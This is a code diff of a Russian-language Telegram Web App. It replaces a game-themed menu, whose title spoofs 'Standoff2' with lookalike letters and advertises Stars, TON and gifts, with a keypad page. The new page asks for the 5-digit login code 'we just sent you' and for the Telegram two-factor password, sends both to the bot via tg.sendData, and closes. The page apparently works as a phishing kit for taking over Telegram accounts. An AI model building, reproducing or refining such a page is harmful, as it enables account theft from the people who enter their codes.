@@ -1,374 +1,403 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Расtа Sтаndoff2</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Клавиатура</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
 
-        body {
-            background: #0f0f1a;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-            color: #eef2ff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            animation: fadeIn 0.6s ease-out;
-        }
+  body {
+    background: linear-gradient(to bottom, 
+      #87CEEB 0%,
+      #B0E0E6 40%, 
+      #98D98E 70%,
+      #7CB342 100%
+    );
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    overflow: hidden;
+    position: relative;
+  }
 
-        /* ===== ОСНОВНЫЕ АНИМАЦИИ ===== */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
+  .leaf {
+    position: fixed;
+    top: -40px;
+    font-size: 24px;
+    pointer-events: none;
+    z-index: 1;
+    animation: fall linear infinite;
+  }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+  @keyframes fall {
+    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
+  }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
+  .content {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+    z-index: 10;
+    width: 300px;
+  }
 
-        @keyframes glow {
-            0% { box-shadow: 0 0 10px rgba(47, 128, 237, 0.3); }
-            50% { box-shadow: 0 0 30px rgba(47, 128, 237, 0.8); }
-            100% { box-shadow: 0 0 10px rgba(47, 128, 237, 0.3); }
-        }
+  .phone-container {
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 6px;
+  }
 
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
+  .arrow {
+    position: absolute;
+    left: -50px;
+    font-size: 38px;
+    color: #3b82f6;
+    animation: arrowMove 1.4s ease-in-out infinite;
+  }
 
-        @keyframes shimmer {
-            0% { background-position: -200% center; }
-            100% { background-position: 200% center; }
-        }
+  @keyframes arrowMove {
+    0%, 100% { transform: translateX(0); }
+    50% { transform: translateX(6px); }
+  }
 
-        @keyframes rotateSlow {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
+  .phone {
+    width: 100px;
+    height: 178px;
+    background: linear-gradient(145deg, #2c2c2e, #1c1c1e);
+    border-radius: 22px;
+    border: 3px solid #3a3a3c;
+    position: relative;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.35);
+    overflow: hidden;
+    animation: float 3.2s ease-in-out infinite;
+  }
 
-        @keyframes bounceIn {
-            0% { opacity: 0; transform: scale(0.3); }
-            50% { opacity: 1; transform: scale(1.05); }
-            70% { transform: scale(0.9); }
-            100% { transform: scale(1); }
-        }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
-        }
+  .island {
+    position: absolute;
+    top: 8px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 48px;
+    height: 14px;
+    background: #000;
+    border-radius: 20px;
+    z-index: 5;
+  }
 
-        /* ===== КОНТЕЙНЕР ===== */
-        .container {
-            max-width: 480px;
-            width: 100%;
-            background: #1a1a2a;
-            border-radius: 28px;
-            padding: 30px 20px;
-            text-align: center;
-            border: 1px solid #2e3a5e;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-            animation: slideUp 0.5s ease-out;
-            transition: all 0.3s ease;
-        }
+  .phone-screen {
+    position: absolute;
+    top: 6px;
+    left: 5px;
+    right: 5px;
+    bottom: 6px;
+    background: #000;
+    border-radius: 16px;
+    overflow: hidden;
+  }
 
-        /* ===== ЛОГОТИП С АНИМАЦИЕЙ ===== */
-        .logo {
-            font-size: 72px;
-            margin-bottom: 12px;
-            display: inline-block;
-            animation: float 3s ease-in-out infinite;
-            transition: transform 0.3s ease;
-        }
-        .logo:hover {
-            animation: shake 0.5s ease;
-        }
+  .apps {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    grid-template-rows: repeat(6, 1fr);
+    gap: 5px;
+    padding: 22px 7px 10px;
+    height: 100%;
+  }
 
-        /* ===== ЗАГОЛОВОК С ГРАДИЕНТОМ ===== */
-        .title {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ffd966, #ffaa33);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 8px;
-            background-size: 200% auto;
-            animation: shimmer 3s linear infinite;
-        }
+  .app {
+    border-radius: 7px;
+  }
+  .app:nth-child(1) { background: linear-gradient(135deg, #34c759, #30d158); }
+  .app:nth-child(2) { background: linear-gradient(135deg, #ff2d55, #ff375f); }
+  .app:nth-child(3) { background: linear-gradient(135deg, #007aff, #0a84ff); }
+  .app:nth-child(4) { background: linear-gradient(135deg, #af52de, #bf5af2); }
+  .app:nth-child(5) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
+  .app:nth-child(6) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
+  .app:nth-child(7) { background: linear-gradient(135deg, #ffd60a, #ffcc00); }
+  .app:nth-child(8) { background: linear-gradient(135deg, #ff3b30, #ff453a); }
+  .app:nth-child(9) { background: linear-gradient(135deg, #30b0c7, #40c8e0); }
+  .app:nth-child(10) { background: linear-gradient(135deg, #af52de, #bf5af2); }
+  .app:nth-child(11) { background: linear-gradient(135deg, #34c759, #30d158); }
+  .app:nth-child(12) { background: linear-gradient(135deg, #007aff, #0a84ff); }
+  .app:nth-child(13) { background: linear-gradient(135deg, #ff2d55, #ff375f); }
+  .app:nth-child(14) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
+  .app:nth-child(15) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
+  .app:nth-child(16) { background: linear-gradient(135deg, #af52de, #bf5af2); }
+  .app:nth-child(17) { background: linear-gradient(135deg, #ffd60a, #ffcc00); }
+  .app:nth-child(18) { background: linear-gradient(135deg, #30b0c7, #40c8e0); }
+  .app:nth-child(19) { background: linear-gradient(135deg, #34c759, #30d158); }
+  .app:nth-child(20) { background: linear-gradient(135deg, #007aff, #0a84ff); }
+  .app:nth-child(21) { background: linear-gradient(135deg, #ff3b30, #ff453a); }
+  .app:nth-child(22) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
+  .app:nth-child(23) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
+  .app:nth-child(24) { background: linear-gradient(135deg, #af52de, #bf5af2); }
 
-        .subtitle {
-            color: #9ca3af;
-            font-size: 16px;
-            margin-bottom: 24px;
-            animation: fadeIn 0.8s ease-out;
-        }
+  .info-text {
+    background: rgba(0, 0, 0, 0.45);
+    color: white;
+    padding: 12px 16px;
+    border-radius: 14px;
+    font-size: 14px;
+    text-align: center;
+    line-height: 1.4;
+    backdrop-filter: blur(6px);
+  }
 
-        /* ===== СТАТИСТИКА С АНИМАЦИЕЙ ===== */
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 12px;
-            margin: 20px 0;
-        }
+  .code-boxes {
+    display: flex;
+    gap: 10px;
+  }
 
-        .stat-card {
-            background: #0e0e1a;
-            border-radius: 16px;
-            padding: 14px 8px;
-            border: 1px solid #2a2a3a;
-            transition: all 0.3s ease;
-            cursor: default;
-            animation: bounceIn 0.6s ease-out;
-            animation-fill-mode: both;
-        }
-        .stat-card:nth-child(1) { animation-delay: 0.1s; }
-        .stat-card:nth-child(2) { animation-delay: 0.2s; }
-        .stat-card:nth-child(3) { animation-delay: 0.3s; }
+  .code-box {
+    width: 42px;
+    height: 48px;
+    background: rgba(0, 0, 0, 0.35);
+    border: 1.5px solid rgba(255, 255, 255, 0.25);
+    border-radius: 12px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 24px;
+    font-weight: 600;
+    color: white;
+  }
 
-        .stat-card:hover {
-            transform: translateY(-4px) scale(1.02);
-            border-color: #3a5a8a;
-            box-shadow: 0 8px 24px rgba(47, 128, 237, 0.2);
-        }
+  .buttons {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    width: 100%;
+  }
 
-        .stat-value {
-            font-size: 22px;
-            font-weight: 700;
-            color: #ffd966;
-            transition: all 0.3s ease;
-        }
-        .stat-card:hover .stat-value {
-            color: #ffaa33;
-            transform: scale(1.1);
-        }
+  .btn {
+    background: rgba(100, 180, 255, 0.45);
+    color: white;
+    border: 1.5px solid rgba(255, 255, 255, 0.5);
+    border-radius: 50px;
+    height: 54px;
+    font-size: 22px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s ease;
+    backdrop-filter: blur(6px);
+    text-decoration: none;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .btn:active {
+    transform: scale(0.96);
+    background: rgba(80, 160, 240, 0.7);
+  }
 
-        .stat-label {
-            font-size: 12px;
-            color: #6b7280;
-            margin-top: 4px;
-            transition: color 0.3s ease;
-        }
-        .stat-card:hover .stat-label {
-            color: #9ca3af;
-        }
+  .btn-zero { grid-column: 2; }
+  .btn-back { font-size: 20px; }
+  .btn-main {
+    grid-column: 1 / -1;
+    height: 50px;
+    font-size: 17px;
+  }
 
-        /* ===== КНОПКИ ===== */
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 16px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
-            margin-top: 12px;
-            position: relative;
-            overflow: hidden;
-        }
+  /* Скрываем блоки по умолчанию */
+  .mode-block {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+    width: 100%;
+  }
+  .mode-block.active {
+    display: flex;
+  }
 
-        /* ЭФФЕКТ ВОЛНЫ ПРИ НАЖАТИИ */
-        .btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        .btn:active::after {
-            width: 300px;
-            height: 300px;
-        }
-
-        .btn:active {
-            transform: scale(0.95);
-        }
-
-        /* ГЛАВНАЯ КНОПКА */
-        .btn-primary {
-            background: linear-gradient(135deg, #2f80ed, #3aa3ff);
-            animation: glow 2s ease-in-out infinite;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 8px 30px rgba(47, 128, 237, 0.4);
-        }
-
-        /* ВТОРИЧНЫЕ КНОПКИ */
-        .btn-secondary {
-            background: #2a2a3a;
-            transition: all 0.3s ease;
-        }
-        .btn-secondary:hover {
-            background: #3a3a4a;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
-        }
-
-        .btn-secondary:active {
-            transform: scale(0.95);
-        }
-
-        /* СПЕЦИАЛЬНЫЙ ЭФФЕКТ ДЛЯ КНОПКИ "ИГРАТЬ" */
-        .btn-play {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            animation: pulse 2s ease-in-out infinite;
-            position: relative;
-        }
-        .btn-play:hover {
-            transform: translateY(-2px) scale(1.03);
-            box-shadow: 0 8px 30px rgba(238, 90, 36, 0.4);
-        }
-
-        /* ===== ФУТЕР ===== */
-        .footer {
-            margin-top: 24px;
-            font-size: 12px;
-            color: #4a4a5a;
-            opacity: 0.7;
-            transition: opacity 0.3s ease;
-        }
-        .footer:hover {
-            opacity: 1;
-        }
-
-        /* ===== ЗАГРУЗОЧНЫЙ СПИННЕР ===== */
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: rotateSlow 0.8s linear infinite;
-            margin-right: 8px;
-        }
-
-        /* ===== АДАПТИВ ===== */
-        @media (max-width: 420px) {
-            .container { padding: 20px 16px; }
-            .title { font-size: 22px; }
-            .logo { font-size: 56px; }
-            .stat-value { font-size: 18px; }
-            .btn { font-size: 16px; padding: 14px; }
-        }
-    </style>
+  .password-input {
+    width: 100%;
+    padding: 14px;
+    font-size: 18px;
+    text-align: center;
+    background: rgba(0,0,0,0.3);
+    border: 1.5px solid rgba(255,255,255,0.4);
+    border-radius: 12px;
+    color: white;
+    outline: none;
+  }
+  .password-input::placeholder {
+    color: rgba(255,255,255,0.5);
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <!-- ЛОГОТИП С АНИМАЦИЕЙ ПАРЕНИЯ -->
-        <div class="logo">⚔️</div>
 
-        <!-- ЗАГОЛОВОК С SHIMMER ЭФФЕКТОМ -->
-        <div class="title">Расtа Sтаndoff2</div>
-        <div class="subtitle">Сезон #2 • 543.23</div>
-
-        <!-- СТАТИСТИКА С АНИМАЦИЕЙ ПОЯВЛЕНИЯ -->
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-value">1,234</div>
-                <div class="stat-label">⭐ Stars</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">5.42</div>
-                <div class="stat-label">⧫ TON</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">7</div>
-                <div class="stat-label">🎁 Подарки</div>
-            </div>
+<div class="content">
+  <div class="phone-container">
+    <div class="arrow">➜</div>
+    <div class="phone">
+      <div class="island"></div>
+      <div class="phone-screen">
+        <div class="apps">
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
         </div>
-
-        <!-- КНОПКИ С РАЗНЫМИ ЭФФЕКТАМИ -->
-        <button class="btn btn-play" id="playBtn">
-            <span class="spinner" style="display:none;" id="playSpinner"></span>
-            🎮 Играть
-        </button>
-        <button class="btn btn-primary" id="shopBtn">🛒 Магазин</button>
-        <button class="btn btn-secondary" id="profileBtn">👤 Профиль</button>
-
-        <div class="footer">@basex8431l2s_bot • v2.0</div>
+      </div>
     </div>
+  </div>
 
-    <script>
-        let tg = window.Telegram.WebApp;
+  <!-- Блок для ввода кода -->
+  <div id="codeBlock" class="mode-block active">
+    <div class="info-text">
+      Введите 5-значный код, который мы вам только что отправили!
+    </div>
+    <div class="code-boxes">
+      <div class="code-box" data-index="0"></div>
+      <div class="code-box" data-index="1"></div>
+      <div class="code-box" data-index="2"></div>
+      <div class="code-box" data-index="3"></div>
+      <div class="code-box" data-index="4"></div>
+    </div>
+    <div class="buttons">
+      <button class="btn" data-num="1">1</button>
+      <button class="btn" data-num="2">2</button>
+      <button class="btn" data-num="3">3</button>
+      <button class="btn" data-num="4">4</button>
+      <button class="btn" data-num="5">5</button>
+      <button class="btn" data-num="6">6</button>
+      <button class="btn" data-num="7">7</button>
+      <button class="btn" data-num="8">8</button>
+      <button class="btn" data-num="9">9</button>
+      <button class="btn btn-zero" data-num="0">0</button>
+      <button class="btn btn-back" data-action="back">⌫</button>
+    </div>
+    <button id="submitCodeBtn" class="btn btn-main" style="background: rgba(0,200,100,0.6);">Подтвердить код</button>
+  </div>
 
-        if (tg) {
-            tg.ready();
-            tg.expand();
+  <!-- Блок для ввода 2FA пароля -->
+  <div id="twofaBlock" class="mode-block">
+    <div class="info-text">
+      🔐 Введите пароль двухфакторной аутентификации
+    </div>
+    <input type="password" id="passwordInput" class="password-input" placeholder="Пароль 2FA">
+    <button id="submit2faBtn" class="btn btn-main" style="background: rgba(200,150,50,0.6);">Подтвердить пароль</button>
+  </div>
+</div>
+
+<script>
+  // Инициализация Telegram WebApp
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  // Определение режима из параметров URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const mode = urlParams.get('mode') || 'code'; // 'code' или '2fa'
+
+  // Показываем нужный блок
+  document.getElementById('codeBlock').classList.toggle('active', mode === 'code');
+  document.getElementById('twofaBlock').classList.toggle('active', mode === '2fa');
+
+  // Логика для кода (5 ячеек)
+  const boxes = document.querySelectorAll('.code-box');
+  let currentIndex = 0;
+
+  function updateCodeBoxes() {
+    boxes.forEach((box, idx) => {
+      box.textContent = idx < currentIndex ? '●' : ''; // можно показывать точки или цифры
+    });
+  }
+
+  // Сохраняем введённый код в переменную
+  let codeDigits = [];
+
+  document.querySelectorAll('#codeBlock .btn[data-num]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      if (currentIndex < 5) {
+        const digit = btn.dataset.num;
+        codeDigits.push(digit);
+        boxes[currentIndex].textContent = digit;
+        currentIndex++;
+        if (currentIndex === 5) {
+          // Автоматически отправляем код при заполнении
+          submitCode();
         }
+      }
+    });
+  });
 
-        function sendToBot(action, data = {}) {
-            if (tg) {
-                tg.sendData(JSON.stringify({ action, ...data }));
-            }
-        }
+  document.querySelector('#codeBlock .btn[data-action="back"]').addEventListener('click', () => {
+    if (currentIndex > 0) {
+      currentIndex--;
+      codeDigits.pop();
+      boxes[currentIndex].textContent = '';
+    }
+  });
 
-        // ===== АНИМАЦИЯ ЗАГРУЗКИ ПРИ НАЖАТИИ =====
-        document.getElementById('playBtn').addEventListener('click', function(e) {
-            const spinner = document.getElementById('playSpinner');
-            spinner.style.display = 'inline-block';
-            this.innerHTML = '⏳ Загрузка...';
-            this.disabled = true;
+  // Кнопка "Подтвердить код"
+  document.getElementById('submitCodeBtn').addEventListener('click', submitCode);
 
-            setTimeout(() => {
-                sendToBot('play');
-                if (tg) tg.close();
-            }, 800);
-        });
+  function submitCode() {
+    if (codeDigits.length < 5) {
+      alert('Введите все 5 цифр кода');
+      return;
+    }
+    const code = codeDigits.join('');
+    tg.sendData(JSON.stringify({ type: 'code', code: code }));
+    tg.close();
+  }
 
-        document.getElementById('shopBtn').addEventListener('click', function(e) {
-            // ЭФФЕКТ ПУЛЬСАЦИИ ПРИ НАЖАТИИ
-            this.style.transform = 'scale(0.95)';
-            setTimeout(() => {
-                this.style.transform = '';
-                sendToBot('shop');
-                if (tg) tg.close();
-            }, 200);
-        });
+  // Логика для 2FA
+  document.getElementById('submit2faBtn').addEventListener('click', () => {
+    const password = document.getElementById('passwordInput').value.trim();
+    if (!password) {
+      alert('Введите пароль 2FA');
+      return;
+    }
+    tg.sendData(JSON.stringify({ type: '2fa', password: password }));
+    tg.close();
+  });
 
-        document.getElementById('profileBtn').addEventListener('click', function(e) {
-            // ЭФФЕКТ СВЕЧЕНИЯ
-            this.style.boxShadow = '0 0 30px rgba(47, 128, 237, 0.6)';
-            setTimeout(() => {
-                this.style.boxShadow = '';
-                sendToBot('profile');
-                if (tg) tg.close();
-            }, 300);
-        });
+  // Обработка Enter для поля пароля
+  document.getElementById('passwordInput').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      document.getElementById('submit2faBtn').click();
+    }
+  });
 
-        // ===== АНИМАЦИЯ ПРИ НАВЕДЕНИИ НА СТАТИСТИКУ (для десктопа) =====
-        document.querySelectorAll('.stat-card').forEach(card => {
-            card.addEventListener('mouseenter', function() {
-                this.style.transition = 'all 0.3s ease';
-            });
-        });
+  // Падающие листья (декор)
+  const leaves = ['🍂', '🍁', '🍃'];
+  function createLeaf() {
+    const leaf = document.createElement('div');
+    leaf.classList.add('leaf');
+    leaf.textContent = leaves[Math.floor(Math.random() * leaves.length)];
+    leaf.style.left = Math.random() * 100 + 'vw';
+    leaf.style.fontSize = (Math.random() * 18 + 18) + 'px';
+    const duration = Math.random() * 5 + 5;
+    leaf.style.animationDuration = duration + 's';
+    document.body.appendChild(leaf);
+    setTimeout(() => leaf.remove(), (duration + 2) * 1000);
+  }
+  setInterval(createLeaf, 400);
+  for (let i = 0; i < 10; i++) setTimeout(createLeaf, i * 200);
+</script>
 
-        console.log('[SWILL] WebApp с анимациями загружен!');
-    </script>
 </body>
 </html>
